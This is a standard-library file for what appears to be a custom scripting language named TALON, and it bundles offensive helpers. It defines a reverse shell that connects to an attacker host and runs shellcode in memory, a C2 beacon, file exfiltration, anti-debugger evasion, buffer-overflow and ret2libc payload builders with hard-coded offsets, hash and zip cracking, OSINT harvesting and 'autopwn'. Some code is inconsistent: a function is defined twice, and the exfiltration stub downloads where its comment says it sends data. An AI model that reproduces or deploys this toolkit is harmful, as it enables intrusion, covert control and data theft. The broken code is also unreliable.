# ═══════════════════════════════════════════════════════════════
# TALON STANDARD LIBRARY - Quick Start Helpers
# ═══════════════════════════════════════════════════════════════

# Quick port scanner
define function quick_scan(target, start_port, end_port)
    for port in start_port..end_port
        connect to target on port port
    end
end

# Quick reverse shell
define function quick_revshell(lhost, lport)
    connect to lhost on port lport
    execute shellcode in memory
end

# Quick file download
define function quick_download(url, output)
    download from url to output
end

# Quick XOR encryption/decryption
define function xor_bytes(data, key)
    let result = []
    for i in 0..len(data)
        let byte = data[i] ^ key
        result.push(byte)
    end
    return result
end

# Quick base64 operations
define function b64_encode(data)
    encode base64 data
end

define function b64_decode(data)
    decode base64 data
end

# Quick format string leak
define function leak_addr(offset)
    return "%{offset}$p"
end

# Quick NOP sled generator
define function nops(size)
    nop_sled of length size
end

# Quick buffer overflow payload
define function overflow_payload(padding, ret_addr, shellcode)
    let nop_pad = nops(100)
    return padding + nop_pad + shellcode + ret_addr
end

# Quick ROP chain builder
define function rop_chain(gadgets)
    let chain = []
    for gadget in gadgets
        chain.push(gadget)
    end
    return chain
end

# Quick ret2libc
define function ret2libc(libc_base, cmd_addr)
    let pop_rdi = libc_base + 0x0002155f
    let system = libc_base + 0x050d60
    return rop_chain([pop_rdi, cmd_addr, system])
end

# Quick environment check
define function check_safe_env()
    exit if debugger detected
end

# Quick beacon setup
define function quick_beacon(c2_url, interval_secs)
    beacon to c2_url every interval_secs seconds
end

# Quick file exfil
define function exfil_file(file_path, target_url)
    read file file_path into data
    # Send via HTTP POST (pseudo-code)
    download from target_url to "/dev/null"
end

# Quick process memory dump
define function dump_proc_mem(address, size)
    dump memory from address for size bytes
end

# Quick AES encryption helper
define function quick_encrypt(plaintext, key, nonce)
    encrypt data plaintext with key key and nonce nonce using aes-gcm
end

# Quick ECC keypair
define function gen_keys(curve_name)
    generate ecc keypair for curve curve_name
end

# Quick network info leak
define function leak_network_info()
    connect to "8.8.8.8" on port 53
end

# ═══════════════════════════════════════════════════════════════
# 🚀 NEW CTF/PENTESTING HELPERS
# ═══════════════════════════════════════════════════════════════

# Web Exploitation
define function quick_sqli_test(url, param)
    test sql injection on url with parameter param
end

define function quick_xss_test(url, param)
    test xss on url with parameter param
end

# Crypto & Hashing
define function identify_hash(hash_string)
    identify hash type hash_string
end

define function crack_hash(hash, wordlist)
    crack hash hash using wordlist wordlist
end

define function quick_wordlist_gen(base_word)
    generate wordlist mutations from base_word
end

# Steganography
define function extract_lsb(image_path)
    extract lsb from image image_path
end

define function find_hidden_files(file_path)
    search for hidden files in file_path
end

# Encoding/Decoding
define function quick_b32_encode(data)
    encode base32 data
end

define function quick_url_encode(data)
    url encode data
end

define function rot13(text)
    apply rot13 to text
end

define function try_all_decodings(encoded_data)
    attempt all decodings on encoded_data
end

# CTF Helpers
define function find_flags(file_path)
    search for ctf flags in file_path
end

define function auto_identify_challenge(file_path)
    identify ctf challenge type file_path
end

define function show_ctf_cheatsheet(category)
    display cheatsheet for category
end

# Forensics
define function carve_files(disk_image, output_dir)
    carve files from disk_image to output_dir
end

define function analyze_timeline(directory)
    create timeline analysis for directory
end

define function extract_strings_min(file_path, min_length)
    extract strings from file_path with minimum length min_length
end

# OSINT
define function enumerate_subdomains(domain)
    enumerate subdomains for domain
end

define function harvest_emails(url)
    harvest emails from url
end

define function whois_lookup(domain)
    perform whois lookup on domain
end

define function extract_gps(image_path)
    extract gps coordinates from image_path
end

define function search_username(username)
    search for username across platforms
end

# Binary Patching
define function patch_binary(binary_path, offset, new_bytes, output_path)
    patch binary_path at offset with new_bytes save to output_path
end

define function nop_instructions(binary_path, start, count, output_path)
    nop instructions in binary_path from start for count bytes save to output_path
end

define function hex_search(file_path, hex_pattern)
    search for hex pattern hex_pattern in file_path
end

# Archive Tools
define function auto_extract(archive_path, output_dir)
    automatically extract archive_path to output_dir
end

define function create_zip(files, output_zip)
    create zip archive output_zip from files
end

define function crack_zip_password(zip_path, wordlist)
    crack zip password for zip_path using wordlist
end

# Network Packet Tools
define function craft_tcp_syn(dst_port)
    craft tcp syn packet to dst_port
end

define function send_udp_packet(target_ip, dst_port, payload)
    send udp packet to target_ip on dst_port with payload
end

define function syn_scan_range(target, start_port, end_port)
    perform syn scan on target from start_port to end_port
end

# ═══════════════════════════════════════════════════════════════
# 🌟 WORLD-CLASS EXPLOIT DEV HELPERS
# ═══════════════════════════════════════════════════════════════

# Packing/Unpacking (pwntools-style)
define function pack64(value)
    pack value as 64-bit little-endian
end

define function unpack64(bytes)
    unpack bytes as 64-bit little-endian
end

define function pack32(value)
    pack value as 32-bit little-endian
end

define function unpack32(bytes)
    unpack bytes as 32-bit little-endian
end

define function flat_pack(values)
    pack all values as 64-bit and concatenate
end

# Cyclic Patterns
define function cyclic(length)
    generate cyclic pattern of length bytes
end

define function cyclic_find(value)
    find offset of value in cyclic pattern
end

# Interactive I/O
define function remote(host, port)
    connect to host on port and return socket
end

define function sendline(socket, data)
    send data with newline to socket
end

define function recvuntil(socket, delimiter)
    receive until delimiter found
end

define function recvline(socket)
    receive one line from socket
end

define function interactive(socket)
    enter interactive mode with socket
end

# ELF/Binary Analysis
define function elf_load(binary_path)
    load elf binary and parse symbols
end

define function elf_symbol(elf, name)
    get symbol address from elf
end

define function elf_plt(elf, name)
    get plt entry for function
end

define function elf_got(elf, name)
    get got entry for function
end

define function checksec(binary)
    display security features of binary
end

# ROP Gadgets
define function rop_find(binary, pattern)
    find rop gadget matching pattern
end

define function rop_chain(gadgets)
    build rop chain from gadget addresses
end

define function ret2libc_chain(libc_base, cmd)
    build automatic ret2libc chain
end

# Format String
define function fmtstr_leak(offset)
    generate format string leak payload
end

define function fmtstr_write(address, value, offset)
    generate format string write payload
end

define function fmtstr_auto(binary, offset)
    auto-exploit format string vulnerability
end

# Shellcode Encoding
define function xor_encode_shellcode(shellcode, key)
    xor encode shellcode with key
end

define function alphanumeric_encode(shellcode)
    encode shellcode to alphanumeric
end

define function find_bad_chars(shellcode, bad_chars)
    find bad characters in shellcode
end

# Exploit Templates
define function generate_bof_exploit(binary, offset, ret_addr)
    generate buffer overflow exploit template
end

define function generate_rop_exploit(binary)
    generate rop chain exploit template
end

define function autopwn(binary)
    automatically analyze and generate exploit
end

# Quick Helpers
define function p64(value)
    pack 64-bit value (alias for pack64)
end

define function u64(bytes)
    unpack 64-bit value (alias for unpack64)
end

define function p32(value)
    pack 32-bit value (alias for pack32)
end

define function u32(bytes)
    unpack 32-bit value (alias for unpack32)
end
